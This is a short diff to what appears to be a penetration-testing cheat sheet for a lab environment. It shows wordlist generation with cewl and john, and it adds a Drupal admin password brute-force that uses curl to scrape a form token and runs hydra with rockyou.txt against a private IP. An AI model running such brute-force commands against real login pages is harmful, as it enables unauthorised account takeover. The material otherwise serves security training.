@@ -63,5 +63,9 @@ cewl www.megacorpone.com -m 6 -w /root/newfilelist.txt 2>/dev/null
   ## Mangle/permutate a wordlist with john
 john --wordlist=cewlgeneratedwordlist.txt --rules --stdout > megamangled.txt
 
-
+  ## Drupal bruteforce attack
+  #crack the password of admin
+site="192.168.230.147"
+id=$(curl -s http://$site/user/|grep "form_build_id" |cut -d"\"" -f6)
+hydra -L userlist.txt -P /usr/share/wordlists/rockyou.txt $site http-form-post "/?q=user/:name=^USER^&pass=^PASS^&form_id=user_login&form_build_id="$id":Sorry" -V
 
